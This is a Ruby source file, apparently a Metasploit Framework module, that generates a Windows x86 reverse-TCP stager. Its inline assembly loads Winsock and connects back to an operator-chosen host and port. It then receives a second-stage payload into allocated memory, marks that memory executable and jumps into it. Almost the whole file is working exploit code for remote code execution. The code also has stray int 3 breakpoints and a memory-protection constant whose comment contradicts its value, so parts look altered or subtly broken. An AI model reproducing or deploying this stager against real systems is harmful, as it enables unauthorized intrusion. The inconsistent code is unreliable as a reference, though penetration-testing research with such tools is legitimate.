# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/send_uuid'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_X86
#
###

  module Payload::Windows::ReverseTcp

    include Msf::Payload::TransportConfig
    include Msf::Payload::Windows
    include Msf::Payload::Windows::SendUUID
    include Msf::Payload::Windows::BlockApi
    include Msf::Payload::Windows::Exitfunk

    #
    # Register reverse tcp specific options
    #
    def initialize(*args)
      super
      register_advanced_options([ OptString.new('PayloadBindPort', [false, 'Port to bind reverse tcp socket to on target system.']) ], self.class)
    end

    #
    # Generate the first stage
    #
    def generate(opts={})
      ds = opts[:datastore] || datastore
      conf = {
          port:        ds['LPORT'],
          host:        ds['LHOST'],
          retry_count: ds['ReverseConnectRetries'],
          bind_port:   ds['PayloadBindPort'],
          reliable:    false
      }

      # Generate the advanced stager if we have space
      if self.available_space && required_space <= self.available_space
        conf[:exitfunk] = ds['EXITFUNC']
        conf[:reliable] = true
      end

      generate_reverse_tcp(conf)
    end

    #
    # By default, we don't want to send the UUID, but we'll send
    # for certain payloads if requested.
    #
    def include_send_uuid
      false
    end

    def transport_config(opts={})
      transport_config_reverse_tcp(opts)
    end

    #
    # Generate and compile the stager
    #
    def generate_reverse_tcp(opts={})
      combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_tcp(opts)}
      #{asm_block_recv(opts)}
      ^
      Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
    end

    #
    # Determine the maximum amount of space required for the features requested
    #
    def required_space
      # Start with our cached default generated size
      space = cached_size

      # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
      space += 29

      # Reliability adds some bytes!
      space += 44

      space += uuid_required_size if include_send_uuid

      # The final estimated size
      space
    end

    #
    # Generate an assembly stub with the configured feature set and options.
    #
    # @option opts [Integer] :port The port to connect to
    # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
    # @option opts [Integer] :retry_count Number of retry attempts
    #
    def asm_reverse_tcp(opts={})

      retry_count  = [opts[:retry_count].to_i, 1].max
      encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
      encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first

      addr_fam      = 2
      sockaddr_size = 16

      asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the socket for the connection to the server
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      reverse_tcp:
        push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
        push 'ws2_'             ; ...
        push esp                ; Push a pointer to the "ws2_32" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        mov eax, ebp
        call eax                ; LoadLibraryA( "ws2_32" )

        mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
        sub esp, eax            ; alloc some space for the WSAData structure
        push esp                ; push a pointer to this stuct
        push eax                ; push the wVersionRequested parameter
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call ebp                ; WSAStartup( 0x0190, &WSAData );

      set_address:
        push #{retry_count}     ; retry counter

      create_socket:
        push #{encoded_host}    ; host in little-endian format
        push #{encoded_port}    ; family AF_INET and port number
        mov esi, esp            ; save pointer to sockaddr struct

        push eax                ; if we succeed, eax will be zero, push zero for the flags param.
        push eax                ; push null for reserved parameter
        push eax                ; we do not specify a WSAPROTOCOL_INFO structure
        push eax                ; we do not specify a protocol
        inc eax                 ;
        push eax                ; push SOCK_STREAM
        inc eax                 ;
        push eax                ; push AF_INET
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
        xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
    ^
      # Check if a bind port was specified
      if opts[:bind_port]
        bind_port    = opts[:bind_port]
        encoded_bind_port = "0x%.8x" % [bind_port.to_i,2].pack("vn").unpack("N").first
        asm << %Q^
        xor eax, eax
        push 11
        pop ecx
        push_0_loop:
        push eax               ; if we succeed, eax will be zero, push it enough times
                               ; to cater for both IPv4 and IPv6
        loop push_0_loop

                         ; bind to 0.0.0.0/[::], pushed above
        push #{encoded_bind_port}   ; family AF_INET and port number
        mov esi, esp           ; save a pointer to sockaddr_in struct
        push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
        push esi               ; pointer to the sockaddr_in struct
        push edi               ; socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
        call ebp               ; bind( s, &sockaddr_in, 16 );
        push #{encoded_host}    ; host in little-endian format
        push #{encoded_port}    ; family AF_INET and port number
        mov esi, esp
      ^
      end

      asm << %Q^
      try_connect:
        push 16                 ; length of the sockaddr struct
        push esi                ; pointer to the sockaddr struct
        push edi                ; the socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
        call ebp                ; connect( s, &sockaddr, 16 );

        test eax,eax            ; non-zero means a failure
        jz connected

      handle_connect_failure:
        ; decrement our attempt count and try again
        dec dword [esi+8]
        jnz try_connect
    ^

      if opts[:exitfunk]
        asm << %Q^
      failure:
        call exitfunk
      ^
      else
        asm << %Q^
      failure:
        push 0x56A2B5F0         ; hardcoded to exitprocess for size
        call ebp
      ^
      end

      asm << %Q^
      ; this  lable is required so that reconnect attempts include
      ; the UUID stuff if required.
      connected:
    ^

      asm << asm_send_uuid if include_send_uuid

      asm
    end

    #
    # Generate an assembly stub with the configured feature set and options.
    #
    # @option opts [Bool] :reliable Whether or not to enable error handling code
    #
    def asm_block_recv(opts={})
      reliable     = opts[:reliable]
      asm = %Q^
      recv:
        ; Receive the size of the incoming second stage...
        push 0                  ; flags
        push 4                  ; length = sizeof( DWORD );
        push esi                ; the 4 byte buffer on the stack to hold the second stage length
        push edi                ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp                ; recv( s, &dwLength, 4, 0 );
    ^

      if reliable
        asm << %Q^
        ; reliability: check to see if the recv worked, and reconnect
        ; if it fails
        cmp eax, 0
        jle cleanup_socket
      ^
      end

      asm << %Q^
        ; Alloc a RWX buffer for the second stage
        mov esi, [esi]          ; dereference the pointer to the second stage length
        push 0x04               ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; MEM_COMMIT
        push esi                ; push the newly recieved second stage length.
        push 0                  ; NULL as we dont care where the allocation is.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        xchg ebx, eax           ; ebx = our new memory address for the new stage
        push ebx                ; push the address of the new stage so we can return into it

      read_more:
        push 0                  ; flags
        push esi                ; length
        push ebx                ; the current address into our second stage's RWX buffer
        push edi                ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp                ; recv( s, buffer, length, 0 );
    ^

      if reliable
        asm << %Q^
        ; reliability: check to see if the recv worked, and reconnect
        ; if it fails
        cmp eax, 0
        jge read_successful

        ; something failed, free up memory
        pop eax                 ; get the address of the payload
        push 0x4000             ; dwFreeType (MEM_DECOMMIT)
        push 0                  ; dwSize
        push eax                ; lpAddress
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)

      cleanup_socket:
        ; clear up the socket
        push edi                ; socket handle
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call ebp                ; closesocket(socket)

        ; restore the stack back to the connection retry count
        pop esi
        pop esi
        dec [esp]               ; decrement the counter

        ; try again
        jnz create_socket
        jmp failure
      ^
      end

      asm << %Q^
      read_successful:
        add ebx, eax            ; buffer += bytes_received
        sub esi, eax            ; length -= bytes_received, will set flags
        jnz read_more           ; continue if we have more to read
        ;
        int 3
        pushad                  ; preserve all registers
        mov ebx, [esp+0x20]     ; preserve lpAddress (memory address for second stage)
        mov esi, [esp+0x24]     ; preserve dwSize
        push 0x4                ; previous protection constant (PAGE_READWRITE)
        push esp                ; lpflOldProtect (address of previous protection constant)
        push 0x40               ; flNewProtect ("PAGE_EXECUTE_READWRITE") (0x10 "PAGE_EXECUTE" was causing problems)
        push esi                ; dwSize (size of second stage)
        push ebx                ; lpAddress (memory address for second stage)
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualProtect')}
        call ebp                ; VirtualProtect( lpAddress, dwSize, PAGE_EXECUTE, lpflOldProtect )
        pop eax                 ; remove artifact from stack (return value of VirtualProtect is also on the stack)
        popad                   ; restore all registers back to initial state
        int 3
        ;
        ret                     ; return into the second stage

      ^

      if opts[:exitfunk]
        asm << asm_exitfunk(opts)
      end

      asm
    end

  end

end